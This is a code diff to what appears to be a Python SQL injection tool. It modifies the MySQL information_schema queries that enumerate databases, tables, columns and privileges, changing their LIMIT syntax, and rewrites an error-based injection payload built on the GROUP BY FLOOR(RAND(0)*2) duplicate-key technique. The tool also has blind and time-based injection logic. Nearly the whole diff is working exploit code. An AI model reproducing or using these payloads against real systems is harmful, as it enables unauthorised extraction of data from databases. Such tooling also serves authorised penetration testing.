@@ -122,7 +122,7 @@ class API( object ):
                     tmp += data
 
                 self.log( 3, "[D] RAW response:\n-----\n%s\n-------\n" % tmp )
-                return ( None, tmp )  ## TODO: parse tmp & return normal code...
+                return ( 200, tmp )  ## TODO: parse tmp & return normal code...
 
 
         return ( code, html )
@@ -194,7 +194,7 @@ class API( object ):
                 self.log( 0, '[o] result: %s' % res )
             else:
                 arr = []
-                self.log( 0, '[i] searching for count of %s' % g )
+                self.log( 0, '[i] searching for count of %s [%s]' % ( g, sql_cnt ) )
                 cnt = int( self.get( sql_cnt ) )
                 self.log( 0, '[o] count for %s is %s' % ( g, cnt ) )
                 for i in xrange( cnt ):
@@ -213,13 +213,13 @@ class API( object ):
 class SQL( object ):
     arr = { 'mysql': {}, 'postgres': {} }
     arr[ 'mysql' ][ 'user'      ] = "SELECT USER()"
-    arr[ 'mysql' ][ 'dbs'       ] = "SELECT schema_name FROM information_schema.schemata where schema_name != 'information_schema' LIMIT %(i)s,1"
+    arr[ 'mysql' ][ 'dbs'       ] = "SELECT schema_name FROM information_schema.schemata where schema_name != 'information_schema' LIMIT 1 offset %(i)s"
     arr[ 'mysql' ][ 'dbs_cnt'   ] = "SELECT count(schema_name) FROM information_schema.schemata where schema_name != 'information_schema'"
-    arr[ 'mysql' ][ 'tbls'      ] = "SELECT table_name FROM information_schema.tables WHERE table_schema='%(db)s' LIMIT %(i)s,1"
+    arr[ 'mysql' ][ 'tbls'      ] = "SELECT table_name FROM information_schema.tables WHERE table_schema='%(db)s' LIMIT 1 offset %(i)s"
     arr[ 'mysql' ][ 'tbls_cnt'  ] = "SELECT count(table_name) FROM information_schema.tables WHERE table_schema='%(db)s'"
-    arr[ 'mysql' ][ 'cols'      ] = "SELECT column_name FROM information_schema.columns WHERE table_schema='%(db)s' AND table_name='%(tbl)s' LIMIT %(i)s,1"
+    arr[ 'mysql' ][ 'cols'      ] = "SELECT column_name FROM information_schema.columns WHERE table_schema='%(db)s' AND table_name='%(tbl)s' LIMIT 1 offset %(i)s"
     arr[ 'mysql' ][ 'cols_cnt'  ] = "SELECT count(column_name) FROM information_schema.columns WHERE table_schema='%(db)s' AND table_name='%(tbl)s'"
-    arr[ 'mysql' ][ 'privs'     ] = "SELECT privilege_type FROM information_schema.user_privileges WHERE grantee like '%(user)s' LIMIT %(i)s,1";
+    arr[ 'mysql' ][ 'privs'     ] = "SELECT privilege_type FROM information_schema.user_privileges WHERE grantee like '%(user)s' LIMIT 1 offset %(i)s";
     arr[ 'mysql' ][ 'privs_cnt' ] = "SELECT count(privilege_type) FROM information_schema.user_privileges WHERE grantee like '%(user)s'";
 
     def __init__( self, args, eng ):
@@ -256,7 +256,8 @@ class DError( API ):
     """
     def get( self, sss ):
         if self.a.engine == 'mysql':
-            sss = '''(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3)x GROUP BY MID((%s), FLOOR(RAND(0)*2), 64))''' % sss
+            #sss = '''(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3)x GROUP BY MID((%s), FLOOR(RAND(0)*2), 64))''' % sss
+            sss = '''(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3)x GROUP BY SUBSTRING((%s) from FLOOR(RAND(0)*2) for 64))''' % sss
             sss = sql.prepare( sss )
             sss = urllib.quote( sss ) ## TODO: move this to filter functionality
             c, h = self.html( sss )
@@ -293,7 +294,7 @@ class DBlind( API ):
             _, l, _, _, dt = self.codes( tsss )
             
 
-            if self.a.ftime:       ## time based SQLi
+            if self.a.ftime:     ## time based SQLi
                 if dt > self.a.ftime:
                     self.log( 2, '[D] answer time = %s sec. --> FALSE' % dt )
                     s, e = m + 1, e
